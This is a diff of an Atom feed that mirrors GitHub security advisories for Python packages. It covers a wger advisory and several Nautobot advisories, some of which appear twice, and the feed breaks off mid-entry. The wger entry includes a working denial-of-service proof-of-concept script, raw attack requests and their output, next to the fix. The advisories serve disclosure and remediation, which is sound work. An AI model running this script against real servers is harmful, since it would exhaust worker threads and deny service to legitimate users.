@@ -2,7 +2,7 @@
 <feed xmlns="http://www.w3.org/2005/Atom">
     <id>https://azu.github.io/github-advisory-database-rss/pip.rss</id>
     <title>Security Advisory for Python packages hosted at PyPI.org</title>
-    <updated>2026-05-13T14:56:43.769Z</updated>
+    <updated>2026-05-13T15:52:34.925Z</updated>
     <generator>github-advisory-database-rss</generator>
     <link rel="alternate" href="https://github.com/advisories?query=type%3Areviewed+ecosystem%3Apip"/>
     <subtitle>Security Advisory for Python packages hosted at PyPI.org on GitHub</subtitle>
@@ -11,6 +11,852 @@
     <category term="HIGH"/>
     <category term="MODERATE"/>
     <category term="LOW"/>
+    <entry>
+        <title type="html"><![CDATA[[wger] wger has an Uncontrolled Resource Consumption issue]]></title>
+        <id>https://github.com/advisories/GHSA-v25j-wqcw-fvhj</id>
+        <link href="https://github.com/advisories/GHSA-v25j-wqcw-fvhj"/>
+        <updated>2026-05-13T15:33:40.000Z</updated>
+        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
+<p>Any authenticated user can create a routine spanning an arbitrarily long date range (e.g. 100 years) and then trigger the <code>date_sequence</code> computation via any of the routine detail endpoints. The server iterates once per day in an unbounded <code>while</code> loop with no maximum duration validation, causing a single HTTP request to consume multiple seconds of server CPU and return a response containing tens of thousands of entries. Repeated requests can exhaust all worker threads and deny service to other users.</p>
+<h3 id="details">Details</h3>
+<p>The <code>Routine</code> model (file: <code>wger/manager/models/routine.py</code>) has <code>start</code> and <code>end</code> date fields with only one validation -- <code>start</code> must not be after <code>end</code>:</p>
+<pre><code class="language-python"># File: wger/manager/models/routine.py, line 151
+def clean(self):
+    if self.end and self.start and self.start &gt; self.end:
+        raise ValidationError('The start time cannot be after the end time.')
+    # NO maximum duration check
+</code></pre>
+<p>The <code>RoutineSerializer</code> (file: <code>wger/manager/api/serializers.py</code>, line 43) likewise performs no validation on the delta between <code>start</code> and <code>end</code>.</p>
+<p>The <code>date_sequence</code> property (line 256) uses an unbounded loop:</p>
+<pre><code class="language-python"># File: wger/manager/models/routine.py, line 256
+while current_date &lt;= self.end:
+    # heavy computation per day: slots, entries, configs, logs
+    ...
+</code></pre>
+<p>A routine with <code>start=2000-01-01</code> and <code>end=2099-12-31</code> produces <strong>36,525 iterations</strong>, each performing O(slots x entries x configs) work. Five endpoints trigger this computation:</p>
+<ul>
+<li><code>GET /api/v2/routine/&lt;id&gt;/date-sequence-display/</code></li>
+<li><code>GET /api/v2/routine/&lt;id&gt;/date-sequence-gym/</code></li>
+<li><code>GET /api/v2/routine/&lt;id&gt;/structure/</code></li>
+<li><code>GET /api/v2/routine/&lt;id&gt;/logs/</code></li>
+<li><code>GET /api/v2/routine/&lt;id&gt;/stats/</code></li>
+</ul>
+<h3 id="poc">PoC</h3>
+<h4 id="prerequisites">Prerequisites</h4>
+<ul>
+<li>One authenticated user account</li>
+<li>No special permissions required</li>
+</ul>
+<h4 id="attack-steps">Attack Steps</h4>
+<pre><code># 1. Create a 100-year routine
+POST /api/v2/routine/
+Authorization: Token &lt;token&gt;
+Content-Type: application/json
+
+{
+    "name": "DoS routine",
+    "start": "2000-01-01",
+    "end": "2099-12-31"
+}
+
+# 2. Add at least one day (to make computation non-trivial)
+POST /api/v2/day/
+Authorization: Token &lt;token&gt;
+Content-Type: application/json
+
+{
+    "routine": &lt;routine_id&gt;,
+    "order": 1,
+    "name": "Day A"
+}
+
+# 3. Trigger the expensive computation
+GET /api/v2/routine/&lt;routine_id&gt;/date-sequence-display/
+Authorization: Token &lt;token&gt;
+</code></pre>
+<p><strong>Expected:</strong> HTTP 400 (routine duration exceeds maximum)
+<strong>Actual:</strong> HTTP 200 with 36,525 entries after several seconds of server CPU time</p>
+<h4 id="proof-of-concept-script">Proof of Concept Script</h4>
+<pre><code class="language-python">#!/usr/bin/env python3
+"""
+PoC: Unbounded date_sequence Denial of Service
+Target: wger Workout Manager
+Severity: HIGH - CVSS 6.5
+CWE-400: Uncontrolled Resource Consumption
+
+Usage:
+    python3 poc.py http://localhost:8000
+"""
+
+import requests
+import sys
+import time
+
+if len(sys.argv) &lt; 2:
+    print(f"Usage: {sys.argv[0]} &lt;BASE_URL&gt;")
+    print(f"Example: {sys.argv[0]} http://localhost:8000")
+    sys.exit(1)
+
+BASE = sys.argv[1].rstrip("/")
+API = f"{BASE}/api/v2"
+
+ATTACKER_USER = "dos_attacker_poc"
+ATTACKER_PASS = "DosAttack!Poc!2025"
+
+BANNER = """
+=====================================================================
+  PoC: Unbounded date_sequence Denial of Service
+  Severity: HIGH
+  CWE-400: Uncontrolled Resource Consumption
+=====================================================================
+"""
+print(BANNER)
+
+
+# ---- Helper ----
+def api_login(username, password):
+    r = requests.post(f"{API}/login/", json={
+        "username": username, "password": password
+    })
+    if r.status_code == 200:
+        return r.json().get("token")
+    return None
+
+def api_headers(token):
+    return {"Authorization": f"Token {token}", "Content-Type": "application/json"}
+
+
+# ---- 1. Authenticate ----
+
+print("[1] Authenticating...")
+
+token = api_login(ATTACKER_USER, ATTACKER_PASS)
+if not token:
+    print(f"    Registering account...")
+    r = requests.post(f"{API}/register/", json={
+        "username": ATTACKER_USER,
+        "password": ATTACKER_PASS,
+    })
+    if r.status_code in (200, 201):
+        token = r.json().get("token")
+    if not token:
+        token = api_login(ATTACKER_USER, ATTACKER_PASS)
+    if not token:
+        print(f"[-] Cannot authenticate. Response: {r.text[:200]}")
+        sys.exit(1)
+print(f"    Token: {token[:16]}...")
+
+headers = api_headers(token)
+
+
+# ---- 2. Create NORMAL routine (baseline) ----
+
+print("\n[2] Creating baseline routine (30 days)...")
+
+r = requests.post(f"{API}/routine/", headers=headers, json={
+    "name": "Normal 30-day routine",
+    "start": "2025-01-01",
+    "end": "2025-01-31",
+})
+normal_id = r.json()["id"]
+
+r = requests.post(f"{API}/day/", headers=headers, json={
+    "routine": normal_id, "order": 1, "name": "Day A"
+})
+
+print(f"    Routine id={normal_id} (30 days)")
+start_time = time.time()
+r = requests.get(
+    f"{API}/routine/{normal_id}/date-sequence-display/",
+    headers=headers,
+)
+baseline_time = time.time() - start_time
+baseline_entries = len(r.json()) if r.status_code == 200 else 0
+print(f"    date-sequence-display: {r.status_code}, "
+      f"{baseline_entries} entries, {baseline_time:.2f}s")
+
+
+# ---- 3. Create MALICIOUS routine (100 years) ----
+
+print(f"\n[3] Creating malicious routine (100 years = 36,525 days)...")
+
+r = requests.post(f"{API}/routine/", headers=headers, json={
+    "name": "DoS routine - 100 years",
+    "start": "2000-01-01",
+    "end": "2099-12-31",
+})
+
+if r.status_code != 201:
+    print(f"    [-] Failed to create: {r.status_code} {r.text[:200]}")
+    sys.exit(1)
+
+dos_id = r.json()["id"]
+print(f"    Routine id={dos_id}")
+print(f"    start=2000-01-01, end=2099-12-31")
+print(f"    Duration: ~36,525 days (NO validation limit!)")
+
+r = requests.post(f"{API}/day/", headers=headers, json={
+    "routine": dos_id, "order": 1, "name": "DoS Day"
+})
+
+
+# ---- 4. ATTACK ----
+
+print(f"\n{'='*65}")
+print(f"  ATTACK: Triggering date_sequence on 100-year routine")
+print(f"{'='*65}")
+
+print(f"\n  GET {API}/routine/{dos_id}/date-sequence-display/")
+print(f"  This will iterate ~36,525 times in a while loop...")
+
+start_time = time.time()
+try:
+    r = requests.get(
+        f"{API}/routine/{dos_id}/date-sequence-display/",
+        headers=headers,
+        timeout=120,
+    )
+    elapsed = time.time() - start_time
+    dos_entries = len(r.json()) if r.status_code == 200 else 0
+
+    print(f"\n  Response: HTTP {r.status_code}")
+    print(f"  Entries returned: {dos_entries}")
+    print(f"  Time elapsed: {elapsed:.2f}s")
+
+except requests.exceptions.Timeout:
+    elapsed = time.time() - start_time
+    dos_entries = 0
+    print(f"\n  REQUEST TIMED OUT after {elapsed:.2f}s!")
+
+except requests.exceptions.ConnectionError:
+    elapsed = time.time() - start_time
+    dos_entries = 0
+    print(f"\n  CONNECTION LOST after {elapsed:.2f}s!")
+
+
+# ---- 5. VERIFY ----
+
+print(f"\n{'='*65}")
+print(f"  VERIFICATION")
+print(f"{'='*65}")
+
+print(f"\n  Baseline (30-day routine):")
+print(f"    Entries: {baseline_entries}")
+print(f"    Time:    {baseline_time:.2f}s")
+print(f"\n  Malicious (100-year routine):")
+print(f"    Entries: {dos_entries}")
+print(f"    Time:    {elapsed:.2f}s")
+
+if elapsed &gt; baseline_time * 5 or dos_entries &gt; 10000:
+    slowdown = elapsed / baseline_time if baseline_time &gt; 0 else float('inf')
+    print(f"\n  Slowdown factor: {slowdown:.1f}x")
+    print("""
+  +----------------------------------------------------------+
+  |  VULNERABILITY CONFIRMED                                 |
+  |                                                          |
+  |  No maximum duration is enforced on routines.            |
+  |  The date_sequence property loops once per day with no   |
+  |  upper bound. A 100-year routine forces ~36,525          |
+  |  iterations of expensive O(days x slots x configs) work. |
+  |  A single request can exhaust a server worker thread.    |
+  +----------------------------------------------------------+
+""")
+else:
+    print("\n  Response was fast - server may have limits or caching.")
+</code></pre>
+<h4 id="proof-of-concept-output">Proof of Concept Output</h4>
+<pre><code>=====================================================================
+  PoC: Unbounded date_sequence Denial of Service
+  Severity: HIGH
+  CWE-400: Uncontrolled Resource Consumption
+=====================================================================
+
+[1] Authenticating...
+    Registering account...
+    Token: 2ffbb18316fc4e0f...
+
+[2] Creating baseline routine (30 days)...
+    Routine id=5 (30 days)
+    date-sequence-display: 200, 31 entries, 0.02s
+
+[3] Creating malicious routine (100 years = 36,525 days)...
+    Routine id=6
+    start=2000-01-01, end=2099-12-31
+    Duration: ~36,525 days (NO validation limit!)
+
+=================================================================
+  ATTACK: Triggering date_sequence on 100-year routine
+=================================================================
+
+  GET http://localhost/api/v2/routine/6/date-sequence-display/
+  This will iterate ~36,525 times in a while loop...
+
+  Response: HTTP 200
+  Entries returned: 36525
+  Time elapsed: 3.06s
+
+=================================================================
+  VERIFICATION
+=================================================================
+
+  Baseline (30-day routine):
+    Entries: 31
+    Time:    0.02s
+
+  Malicious (100-year routine):
+    Entries: 36525
+    Time:    3.06s
+
+  Slowdown factor: 138.4x
+
+  +----------------------------------------------------------+
+  |  VULNERABILITY CONFIRMED                                 |
+  |                                                          |
+  |  No maximum duration is enforced on routines.            |
+  |  The date_sequence property loops once per day with no   |
+  |  upper bound. A 100-year routine forces ~36,525          |
+  |  iterations of expensive O(days x slots x configs) work. |
+  |  A single request can exhaust a server worker thread.    |
+  +----------------------------------------------------------+
+</code></pre>
+<h3 id="impact">Impact</h3>
+<ol>
+<li><strong>Worker Thread Exhaustion:</strong> Each malicious request ties up a server worker for 3+ seconds (more with populated slots/configs). A handful of concurrent requests can saturate all available workers, making the application unresponsive for legitimate users.</li>
+<li><strong>Amplification with Slots:</strong> The 3-second figure is for a routine with a single empty day. Adding exercises, slot entries, and progression configs multiplies the per-day cost. A fully populated 100-year routine could take minutes per request.</li>
+<li><strong>No Authentication Barrier Beyond Login:</strong> Any registered user can perform this attack. No elevated permissions are required.</li>
+<li><strong>Cache Bypass:</strong> The first request for each routine (or after <code>ROUTINE_CACHE_TTL</code> expires) always runs the full computation. An attacker can create new routines to avoid cache hits.</li>
+<li><strong>Five Affected Endpoints:</strong> <code>date-sequence-display</code>, <code>date-sequence-gym</code>, <code>structure</code>, <code>logs</code>, and <code>stats</code> all trigger the same unbounded loop.</li>
+</ol>
+<h3 id="fix">Fix</h3>
+<h4 id="1-add-maximum-duration-validation-in-the-model">1. Add maximum duration validation in the model</h4>
+<pre><code class="language-python"># File: wger/manager/models/routine.py
+MAX_ROUTINE_DAYS = 365
+
+def clean(self):
+    if self.end and self.start:
+        if self.start &gt; self.end:
+            raise ValidationError('Start cannot be after end.')
+        if (self.end - self.start).days &gt; self.MAX_ROUTINE_DAYS:
+            raise ValidationError(
+                f'Routine cannot span more than {self.MAX_ROUTINE_DAYS} days.'
+            )
+</code></pre>
+<h4 id="2-add-the-same-validation-in-the-serializer">2. Add the same validation in the serializer</h4>
+<pre><code class="language-python"># File: wger/manager/api/serializers.py
+class RoutineSerializer(serializers.ModelSerializer):
+    def validate(self, data):
+        start = data.get('start')
+        end = data.get('end')
+        if start and end and (end - start).days &gt; 365:
+            raise serializers.ValidationError(
+                'Routine cannot span more than 365 days.'
+            )
+        return data
+</code></pre>
+<h4 id="3-add-a-safety-cap-in-date_sequence-defence-in-depth">3. Add a safety cap in date_sequence (defence-in-depth)</h4>
+<pre><code class="language-python"># File: wger/manager/models/routine.py, inside date_sequence property
+MAX_SEQUENCE_DAYS = 400
+count = 0
+while current_date &lt;= self.end:
+    count += 1
+    if count &gt; MAX_SEQUENCE_DAYS:
+        break
+    ...
+</code></pre>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/wger-project/wger/security/advisories/GHSA-v25j-wqcw-fvhj">https://github.com/wger-project/wger/security/advisories/GHSA-v25j-wqcw-fvhj</a></li>
+<li><a href="https://github.com/wger-project/wger/commit/5f07a4473e2c32d298c8cdd31d78e5107840039c">https://github.com/wger-project/wger/commit/5f07a4473e2c32d298c8cdd31d78e5107840039c</a></li>
+<li><a href="https://github.com/advisories/GHSA-v25j-wqcw-fvhj">https://github.com/advisories/GHSA-v25j-wqcw-fvhj</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-v25j-wqcw-fvhj</uri>
+        </author>
+        <category label="severity" term="MODERATE"/>
+        <published>2026-05-13T15:33:38.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[nautobot] Nautobot: GitRepository.current_head field should not be writable through REST API]]></title>
+        <id>https://github.com/advisories/GHSA-p3hx-pwf3-j8wr</id>
+        <link href="https://github.com/advisories/GHSA-p3hx-pwf3-j8wr"/>
+        <updated>2026-05-13T15:31:08.000Z</updated>
+        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
+<p>A user with access to add/change a GitRepository record could use the REST API to directly set the <code>current_head</code> field on the record, which was not intended to be user-editable. Doing so could cause Nautobot's local clone(s) of the relevant repository to checkout a commit other than the latest commit on the specified <code>branch</code> (resulting in misleading state), or potentially to be unable to make use of the repository at all (until manually remediated) due to the <code>current_head</code> pointing to a nonexistent commit hash or malformed value.</p>
+<h3 id="patches">Patches</h3>
+<p>The issue has been remediated in Nautobot v2.4.33 and 3.1.2.</p>
+<h3 id="workarounds">Workarounds</h3>
+<p>Note that many of the same end-result symptoms could be caused by a user with the same level of access simply changing the <code>branch</code> or <code>remote_url</code> of a GitRepository rather than crafting the <code>current_head</code>. Administrators are encouraged to carefully review which users are granted permissions to create and modify GitRepository records.</p>
+<h3 id="references">References</h3>
+<ul>
+<li>2.4.33 (<a href="https://github.com/nautobot/nautobot/commit/9deddfc91ad9260ad17b5e20084e9e2d15be3609">patch</a>)</li>
+<li>3.1.2 (<a href="https://github.com/nautobot/nautobot/commit/c46f97040b2bde4320be36b23577f19a8bcbd8c3">patch</a>)</li>
+</ul>
+<h3 id="references-1">References</h3>
+<ul>
+<li><a href="https://github.com/nautobot/nautobot/security/advisories/GHSA-p3hx-pwf3-j8wr">https://github.com/nautobot/nautobot/security/advisories/GHSA-p3hx-pwf3-j8wr</a></li>
+<li><a href="https://github.com/nautobot/nautobot/commit/9deddfc91ad9260ad17b5e20084e9e2d15be3609">https://github.com/nautobot/nautobot/commit/9deddfc91ad9260ad17b5e20084e9e2d15be3609</a></li>
+<li><a href="https://github.com/nautobot/nautobot/commit/c46f97040b2bde4320be36b23577f19a8bcbd8c3">https://github.com/nautobot/nautobot/commit/c46f97040b2bde4320be36b23577f19a8bcbd8c3</a></li>
+<li><a href="https://github.com/nautobot/nautobot/releases/tag/v2.4.33">https://github.com/nautobot/nautobot/releases/tag/v2.4.33</a></li>
+<li><a href="https://github.com/nautobot/nautobot/releases/tag/v3.1.2">https://github.com/nautobot/nautobot/releases/tag/v3.1.2</a></li>
+<li><a href="https://github.com/advisories/GHSA-p3hx-pwf3-j8wr">https://github.com/advisories/GHSA-p3hx-pwf3-j8wr</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-p3hx-pwf3-j8wr</uri>
+        </author>
+        <category label="severity" term="HIGH"/>
+        <published>2026-05-13T15:31:04.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[nautobot] Nautobot: GitRepository.current_head field should not be writable through REST API]]></title>
+        <id>https://github.com/advisories/GHSA-p3hx-pwf3-j8wr</id>
+        <link href="https://github.com/advisories/GHSA-p3hx-pwf3-j8wr"/>
+        <updated>2026-05-13T15:31:08.000Z</updated>
+        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
+<p>A user with access to add/change a GitRepository record could use the REST API to directly set the <code>current_head</code> field on the record, which was not intended to be user-editable. Doing so could cause Nautobot's local clone(s) of the relevant repository to checkout a commit other than the latest commit on the specified <code>branch</code> (resulting in misleading state), or potentially to be unable to make use of the repository at all (until manually remediated) due to the <code>current_head</code> pointing to a nonexistent commit hash or malformed value.</p>
+<h3 id="patches">Patches</h3>
+<p>The issue has been remediated in Nautobot v2.4.33 and 3.1.2.</p>
+<h3 id="workarounds">Workarounds</h3>
+<p>Note that many of the same end-result symptoms could be caused by a user with the same level of access simply changing the <code>branch</code> or <code>remote_url</code> of a GitRepository rather than crafting the <code>current_head</code>. Administrators are encouraged to carefully review which users are granted permissions to create and modify GitRepository records.</p>
+<h3 id="references">References</h3>
+<ul>
+<li>2.4.33 (<a href="https://github.com/nautobot/nautobot/commit/9deddfc91ad9260ad17b5e20084e9e2d15be3609">patch</a>)</li>
+<li>3.1.2 (<a href="https://github.com/nautobot/nautobot/commit/c46f97040b2bde4320be36b23577f19a8bcbd8c3">patch</a>)</li>
+</ul>
+<h3 id="references-1">References</h3>
+<ul>
+<li><a href="https://github.com/nautobot/nautobot/security/advisories/GHSA-p3hx-pwf3-j8wr">https://github.com/nautobot/nautobot/security/advisories/GHSA-p3hx-pwf3-j8wr</a></li>
+<li><a href="https://github.com/nautobot/nautobot/commit/9deddfc91ad9260ad17b5e20084e9e2d15be3609">https://github.com/nautobot/nautobot/commit/9deddfc91ad9260ad17b5e20084e9e2d15be3609</a></li>
+<li><a href="https://github.com/nautobot/nautobot/commit/c46f97040b2bde4320be36b23577f19a8bcbd8c3">https://github.com/nautobot/nautobot/commit/c46f97040b2bde4320be36b23577f19a8bcbd8c3</a></li>
+<li><a href="https://github.com/nautobot/nautobot/releases/tag/v2.4.33">https://github.com/nautobot/nautobot/releases/tag/v2.4.33</a></li>
+<li><a href="https://github.com/nautobot/nautobot/releases/tag/v3.1.2">https://github.com/nautobot/nautobot/releases/tag/v3.1.2</a></li>
+<li><a href="https://github.com/advisories/GHSA-p3hx-pwf3-j8wr">https://github.com/advisories/GHSA-p3hx-pwf3-j8wr</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-p3hx-pwf3-j8wr</uri>
+        </author>
+        <category label="severity" term="HIGH"/>
+        <published>2026-05-13T15:31:04.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[nautobot] Nautobot: Webhook definitions could be used for server-side request forgery (SSRF)]]></title>
+        <id>https://github.com/advisories/GHSA-c35q-vxrp-ph26</id>
+        <link href="https://github.com/advisories/GHSA-c35q-vxrp-ph26"/>
+        <updated>2026-05-13T15:31:03.000Z</updated>
+        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
+<p>Nautobot's <code>Webhook</code> data model and associated feature set could be configured by users with sufficient access to perform requests to various hosts and IP addresses that should not be permitted, allowing for various behaviors similar to server-side request forgery (SSRF).</p>
+<h3 id="patches">Patches</h3>
+<p>Fixes are available in Nautobot v2.4.33 and v3.1.2.</p>
+<p>In support of this fix, three new settings variables have been added to Nautobot:</p>
+<ul>
+<li><code>WEBHOOK_ALLOWED_SCHEMES</code> - By default new or updated <code>Webhook</code> records will be restricted to HTTP or HTTPS only, disallowing other schemes that may have been previously allowed. Administrators should audit existing <code>Webhook</code> records to identify any that are invalid, and either update/delete said records or customize <code>WEBHOOK_ALLOWED_SCHEMES</code> as appropriate.</li>
+<li><code>WEBHOOK_ADDITIONAL_BLOCKED_NETWORKS</code> - This can be used to specify additional IP networks that should be denied to <code>Webhook</code> sending, for example some deployments may wish to disallow RFC1918 addresses or even disallow all networks and carve out specific exemptions using the following setting.</li>
+<li><code>WEBHOOK_ALLOWED_HOSTS</code> - This can be used to provide an allow-list of specific hosts that would otherwise be blocked by any <code>WEBHOOK_ADDITIONAL_BLOCKED_NETWORKS</code> configuration.</li>
+</ul>
+<h3 id="workarounds">Workarounds</h3>
+<p>Administrators should review which users have been granted <code>add</code> or <code>change</code> permissions for the <code>Webhook</code> data model, and should review currently defined <code>Webhook</code> records for safety and validity. Other than that, no specific workaround has been identified.</p>
+<h3 id="references">References</h3>
+<ul>
+<li>2.4.33 (<a href="https://github.com/nautobot/nautobot/commit/16aa4aa9796ab7a31c4d615ec945e1f16d8c77c4">patch</a>)</li>
+<li>3.1.2 (<a href="https://github.com/nautobot/nautobot/commit/7324c8f0d8c7245fbc691e15d729adc2d2707d08">patch</a>)</li>
+</ul>
+<h3 id="references-1">References</h3>
+<ul>
+<li><a href="https://github.com/nautobot/nautobot/security/advisories/GHSA-c35q-vxrp-ph26">https://github.com/nautobot/nautobot/security/advisories/GHSA-c35q-vxrp-ph26</a></li>
+<li><a href="https://github.com/nautobot/nautobot/commit/16aa4aa9796ab7a31c4d615ec945e1f16d8c77c4">https://github.com/nautobot/nautobot/commit/16aa4aa9796ab7a31c4d615ec945e1f16d8c77c4</a></li>
+<li><a href="https://github.com/nautobot/nautobot/commit/7324c8f0d8c7245fbc691e15d729adc2d2707d08">https://github.com/nautobot/nautobot/commit/7324c8f0d8c7245fbc691e15d729adc2d2707d08</a></li>
+<li><a href="https://github.com/nautobot/nautobot/releases/tag/v2.4.33">https://github.com/nautobot/nautobot/releases/tag/v2.4.33</a></li>
+<li><a href="https://github.com/nautobot/nautobot/releases/tag/v3.1.2">https://github.com/nautobot/nautobot/releases/tag/v3.1.2</a></li>
+<li><a href="https://github.com/advisories/GHSA-c35q-vxrp-ph26">https://github.com/advisories/GHSA-c35q-vxrp-ph26</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-c35q-vxrp-ph26</uri>
+        </author>
+        <category label="severity" term="HIGH"/>
+        <published>2026-05-13T15:30:59.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[nautobot] Nautobot: Webhook definitions could be used for server-side request forgery (SSRF)]]></title>
+        <id>https://github.com/advisories/GHSA-c35q-vxrp-ph26</id>
+        <link href="https://github.com/advisories/GHSA-c35q-vxrp-ph26"/>
+        <updated>2026-05-13T15:31:03.000Z</updated>
+        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
+<p>Nautobot's <code>Webhook</code> data model and associated feature set could be configured by users with sufficient access to perform requests to various hosts and IP addresses that should not be permitted, allowing for various behaviors similar to server-side request forgery (SSRF).</p>
+<h3 id="patches">Patches</h3>
+<p>Fixes are available in Nautobot v2.4.33 and v3.1.2.</p>
+<p>In support of this fix, three new settings variables have been added to Nautobot:</p>
+<ul>
+<li><code>WEBHOOK_ALLOWED_SCHEMES</code> - By default new or updated <code>Webhook</code> records will be restricted to HTTP or HTTPS only, disallowing other schemes that may have been previously allowed. Administrators should audit existing <code>Webhook</code> records to identify any that are invalid, and either update/delete said records or customize <code>WEBHOOK_ALLOWED_SCHEMES</code> as appropriate.</li>
+<li><code>WEBHOOK_ADDITIONAL_BLOCKED_NETWORKS</code> - This can be used to specify additional IP networks that should be denied to <code>Webhook</code> sending, for example some deployments may wish to disallow RFC1918 addresses or even disallow all networks and carve out specific exemptions using the following setting.</li>
+<li><code>WEBHOOK_ALLOWED_HOSTS</code> - This can be used to provide an allow-list of specific hosts that would otherwise be blocked by any <code>WEBHOOK_ADDITIONAL_BLOCKED_NETWORKS</code> configuration.</li>
+</ul>
+<h3 id="workarounds">Workarounds</h3>
+<p>Administrators should review which users have been granted <code>add</code> or <code>change</code> permissions for the <code>Webhook</code> data model, and should review currently defined <code>Webhook</code> records for safety and validity. Other than that, no specific workaround has been identified.</p>
+<h3 id="references">References</h3>
+<ul>
+<li>2.4.33 (<a href="https://github.com/nautobot/nautobot/commit/16aa4aa9796ab7a31c4d615ec945e1f16d8c77c4">patch</a>)</li>
+<li>3.1.2 (<a href="https://github.com/nautobot/nautobot/commit/7324c8f0d8c7245fbc691e15d729adc2d2707d08">patch</a>)</li>
+</ul>
+<h3 id="references-1">References</h3>
+<ul>
+<li><a href="https://github.com/nautobot/nautobot/security/advisories/GHSA-c35q-vxrp-ph26">https://github.com/nautobot/nautobot/security/advisories/GHSA-c35q-vxrp-ph26</a></li>
+<li><a href="https://github.com/nautobot/nautobot/commit/16aa4aa9796ab7a31c4d615ec945e1f16d8c77c4">https://github.com/nautobot/nautobot/commit/16aa4aa9796ab7a31c4d615ec945e1f16d8c77c4</a></li>
+<li><a href="https://github.com/nautobot/nautobot/commit/7324c8f0d8c7245fbc691e15d729adc2d2707d08">https://github.com/nautobot/nautobot/commit/7324c8f0d8c7245fbc691e15d729adc2d2707d08</a></li>
+<li><a href="https://github.com/nautobot/nautobot/releases/tag/v2.4.33">https://github.com/nautobot/nautobot/releases/tag/v2.4.33</a></li>
+<li><a href="https://github.com/nautobot/nautobot/releases/tag/v3.1.2">https://github.com/nautobot/nautobot/releases/tag/v3.1.2</a></li>
+<li><a href="https://github.com/advisories/GHSA-c35q-vxrp-ph26">https://github.com/advisories/GHSA-c35q-vxrp-ph26</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-c35q-vxrp-ph26</uri>
+        </author>
+        <category label="severity" term="HIGH"/>
+        <published>2026-05-13T15:30:59.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[nautobot] Nautobot: Object bulk rename UI actions vulnerable to denial of service by crafted regular expression (REDoS)]]></title>
+        <id>https://github.com/advisories/GHSA-qrpw-gjvh-x5gm</id>
+        <link href="https://github.com/advisories/GHSA-qrpw-gjvh-x5gm"/>
+        <updated>2026-05-13T15:30:53.000Z</updated>
+        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
+<p>Nautobot UI object-bulk-rename endpoints (for example, <code>/dcim/interfaces/rename/</code>) were vulnerable to application-wide denial of service via maliciously crafted regular expressions in the <code>find</code> field in combination with the <code>use_regex</code> flag.</p>
+<h3 id="patches">Patches</h3>
+<p>A general-purpose timeout has been added to these endpoints in Nautobot v2.4.33 and v3.1.2, which ensures that the request will fail early with an appropriate message if regular expression evaluation takes more than a short period of time, instead of continuing to execute for an indefinite duration.</p>
+<h3 id="workarounds">Workarounds</h3>
+<p>No known workaround has been identified at this time.</p>
+<h3 id="references">References</h3>
+<ul>
+<li>2.4.33 (<a href="https://github.com/nautobot/nautobot/commit/c2b766966d814a7141f62c7bc90c85fefb7892ee">patch</a>)</li>
+<li>3.1.2 (<a href="https://github.com/nautobot/nautobot/commit/5a30d0916953afbeedd24a784709e762cc3879cd">patch</a>)</li>
+</ul>
+<h3 id="references-1">References</h3>
+<ul>
+<li><a href="https://github.com/nautobot/nautobot/security/advisories/GHSA-qrpw-gjvh-x5gm">https://github.com/nautobot/nautobot/security/advisories/GHSA-qrpw-gjvh-x5gm</a></li>
+<li><a href="https://github.com/nautobot/nautobot/commit/5a30d0916953afbeedd24a784709e762cc3879cd">https://github.com/nautobot/nautobot/commit/5a30d0916953afbeedd24a784709e762cc3879cd</a></li>
+<li><a href="https://github.com/nautobot/nautobot/commit/c2b766966d814a7141f62c7bc90c85fefb7892ee">https://github.com/nautobot/nautobot/commit/c2b766966d814a7141f62c7bc90c85fefb7892ee</a></li>
+<li><a href="https://github.com/nautobot/nautobot/releases/tag/v2.4.33">https://github.com/nautobot/nautobot/releases/tag/v2.4.33</a></li>
+<li><a href="https://github.com/nautobot/nautobot/releases/tag/v3.1.2">https://github.com/nautobot/nautobot/releases/tag/v3.1.2</a></li>
+<li><a href="https://github.com/advisories/GHSA-qrpw-gjvh-x5gm">https://github.com/advisories/GHSA-qrpw-gjvh-x5gm</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-qrpw-gjvh-x5gm</uri>
+        </author>
+        <category label="severity" term="MODERATE"/>
+        <published>2026-05-13T15:30:53.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[nautobot] Nautobot: Object bulk rename UI actions vulnerable to denial of service by crafted regular expression (REDoS)]]></title>
+        <id>https://github.com/advisories/GHSA-qrpw-gjvh-x5gm</id>
+        <link href="https://github.com/advisories/GHSA-qrpw-gjvh-x5gm"/>
+        <updated>2026-05-13T15:30:53.000Z</updated>
+        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
+<p>Nautobot UI object-bulk-rename endpoints (for example, <code>/dcim/interfaces/rename/</code>) were vulnerable to application-wide denial of service via maliciously crafted regular expressions in the <code>find</code> field in combination with the <code>use_regex</code> flag.</p>
+<h3 id="patches">Patches</h3>
+<p>A general-purpose timeout has been added to these endpoints in Nautobot v2.4.33 and v3.1.2, which ensures that the request will fail early with an appropriate message if regular expression evaluation takes more than a short period of time, instead of continuing to execute for an indefinite duration.</p>
+<h3 id="workarounds">Workarounds</h3>
+<p>No known workaround has been identified at this time.</p>
+<h3 id="references">References</h3>
+<ul>
